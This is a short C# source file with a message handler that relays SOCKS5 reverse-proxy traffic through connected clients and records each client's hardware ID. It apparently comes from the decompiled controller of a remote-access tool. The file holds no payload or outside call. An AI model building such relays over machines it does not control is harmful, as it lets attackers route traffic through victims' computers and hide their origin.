using System;
using Server.Connectings;
using Server.Helper.Sock5;

namespace Server.Messages;

internal class HandlerReverseProxyU
{
	public static void Read(Clients client, object[] objects)
	{
		Console.WriteLine(objects[0]?.ToString() + " " + objects[1]);
		switch ((string)objects[1])
		{
		case "Connect":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			client.Hwid = (string)objects[2];
			client.Tag = Program.form.ReverseProxyU.NewServer(client);
			break;
		case "Accept":
		{
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			Server.Helper.Sock5.Server server = Program.form.ReverseProxyU.ServersPort((int)objects[4]);
			if (server != null)
			{
				Client client3 = server.Search((int)objects[2]);
				if (client3 != null)
				{
					client3.Accept(client);
					client.Tag = client3;
				}
				else
				{
					client.Disconnect();
				}
			}
			else
			{
				client.Disconnect();
			}
			break;
		}
		case "ConnectResponse":
		{
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			Client client2 = (Client)client.Tag;
			client2?.HandleCommandResponse(objects);
			client.Tag = client2;
			break;
		}
		case "Data":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Send((byte[])objects[2]);
			}
			break;
		case "Disconnect":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Disconnect();
			}
			break;
		}
	}
}
